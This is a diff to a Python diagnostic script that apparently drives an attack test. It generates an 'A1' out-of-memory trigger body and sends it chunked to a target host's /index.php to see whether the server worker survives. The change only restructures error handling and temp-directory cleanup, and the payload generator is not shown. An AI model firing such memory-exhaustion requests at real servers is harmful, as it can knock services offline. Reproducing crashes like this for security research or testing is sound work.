@@ -11,6 +11,7 @@ from __future__ import annotations
 
 import argparse
 import os
+import shutil
 import socket
 import subprocess
 import sys
@@ -218,28 +219,32 @@ def main() -> int:
     # ── Step 4: Fire A1 and check if worker survives ──────────
     print("[4/5] Sending A1 (OOM trigger)...")
     tmp = tempfile.mkdtemp(prefix="p2s-diag-")
-    a1 = os.path.join(tmp, "a.bin")
-    subprocess.run([sys.executable, os.path.join(PURE, "mk_a1.py"),
-                    "--out", a1, "--big", "78"], check=True,
-                   stdout=subprocess.DEVNULL)
     try:
-        subprocess.run([sys.executable, os.path.join(PURE, "chunked_send.py"),
-                        "--host", args.host, "--port", str(args.port),
-                        "--body-file", a1, "--path", "/index.php" + Q,
-                        "--timeout", "180",
-                        "--save-response", os.path.join(tmp, "a1.resp")],
-                       check=True, timeout=200)
-        a1_resp = open(os.path.join(tmp, "a1.resp"), "rb").read()
-        print("      A1 response: %d bytes" % len(a1_resp))
-        if a1_resp:
-            status = a1_resp.split(b"\r\n", 1)[0].decode("latin1", "replace")
-            print("      status: %s" % status)
-    except subprocess.TimeoutExpired:
-        print("      A1 timed out (180s) — body may not have delivered")
-        a1_resp = b""
-    except subprocess.CalledProcessError as exc:
-        print("      A1 send failed: %r" % exc)
-        a1_resp = b""
+        a1 = os.path.join(tmp, "a.bin")
+        subprocess.run([sys.executable, os.path.join(PURE, "mk_a1.py"),
+                        "--out", a1, "--big", "78"], check=True,
+                       stdout=subprocess.DEVNULL)
+        try:
+            subprocess.run([sys.executable, os.path.join(PURE, "chunked_send.py"),
+                            "--host", args.host, "--port", str(args.port),
+                            "--body-file", a1, "--path", "/index.php" + Q,
+                            "--timeout", "180",
+                            "--save-response", os.path.join(tmp, "a1.resp")],
+                           check=True, timeout=200)
+            with open(os.path.join(tmp, "a1.resp"), "rb") as fh:
+                a1_resp = fh.read()
+            print("      A1 response: %d bytes" % len(a1_resp))
+            if a1_resp:
+                status = a1_resp.split(b"\r\n", 1)[0].decode("latin1", "replace")
+                print("      status: %s" % status)
+        except subprocess.TimeoutExpired:
+            print("      A1 timed out (180s) — body may not have delivered")
+            a1_resp = b""
+        except subprocess.CalledProcessError as exc:
+            print("      A1 send failed: %r" % exc)
+            a1_resp = b""
+    finally:
+        shutil.rmtree(tmp, ignore_errors=True)
 
     time.sleep(2.0)
 
